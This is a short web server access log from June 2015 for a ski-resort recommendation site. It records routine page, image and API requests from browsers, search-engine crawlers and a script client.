64.58.7.254 - - [22/Jun/2015:15:03:52 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
76.246.43.228 - - [22/Jun/2015:15:04:03 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53"
64.58.7.254 - - [22/Jun/2015:15:04:13 -0700] "-" 408 0 "-" "-"
166.137.242.30 - - [22/Jun/2015:15:06:29 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4"
66.249.79.53 - - [22/Jun/2015:15:12:21 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
108.70.209.181 - - [22/Jun/2015:15:27:07 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3"
108.70.209.181 - - [22/Jun/2015:15:27:07 -0700] "GET /favicon.ico HTTP/1.1" 200 1475 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3"
108.70.209.181 - - [22/Jun/2015:15:27:08 -0700] "GET / HTTP/1.1" 200 2375 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4"
108.70.209.181 - - [22/Jun/2015:15:27:08 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 521 "-" "com.apple.WebKit.WebContent/10600.6.3 CFNetwork/720.3.13 Darwin/14.3.0 (x86_64)"
108.70.209.181 - - [22/Jun/2015:15:27:08 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 512 "-" "com.apple.WebKit.WebContent/10600.6.3 CFNetwork/720.3.13 Darwin/14.3.0 (x86_64)"
170.75.162.130 - - [22/Jun/2015:15:29:26 -0700] "GET /lib/reccapi.php?resort=alyeska HTTP/1.1" 200 942 "-" "node-superagent/0.18.2"
180.76.15.163 - - [22/Jun/2015:15:32:55 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.163 - - [22/Jun/2015:15:33:39 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
71.92.89.144 - - [22/Jun/2015:15:36:03 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
